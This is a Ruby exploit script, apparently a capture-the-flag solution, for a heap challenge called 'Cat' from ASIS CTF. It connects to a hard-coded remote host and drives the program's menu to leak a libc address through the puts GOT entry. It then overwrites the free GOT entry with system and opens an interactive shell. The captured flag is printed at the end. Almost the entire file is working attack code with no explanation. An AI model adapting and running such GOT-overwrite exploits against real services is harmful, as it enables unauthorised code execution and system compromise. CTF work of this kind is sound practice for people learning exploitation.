#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '178.62.40.102', 6000
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'Cat'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug
def pt; z.gets '> '; end

def create(name, kind, old = 1)
  pt; z.puts 1
  pt; z.write name
  pt; z.write kind
  pt; z.puts old
end

def edit(id, name, kind, yn)
  pt; z.puts 2
  pt; z.puts id
  pt; z.write name
  pt; z.write kind
  pt; z.puts 1
  pt; z.puts yn
end

def free(id)
  pt; z.puts 5
  pt; z.puts id
end

create('meow', 'meowkind'); id = 0
edit(id, 'z', 'z', 'n')
ptr_6 = 0x6020a0 + 6 * 8
create('AAAA', ptr_6.p32); # 1
edit(id, p32(elf.got.puts - 16), 'A', 'y')

pt; z.puts 3; pt; z.puts 6 # show id 6
puts_off = 0x6f690
z.gets 'old: '; libc = z.gets.to_i - puts_off
log.dump libc.hex

# again!
create("la", "lala"); id = 1
edit(id, 'zz', 'zzz', 'n')
create('AAAA', elf.got.free.p32) # 2
system_off = 0x45390
edit(id, (libc + system_off).p64[0, 7], 'sh;', 'n')

z.interact

# ubuntu 16.04
# ASIS{5aa9607cca34dba443c2b757a053665179f3f85c}
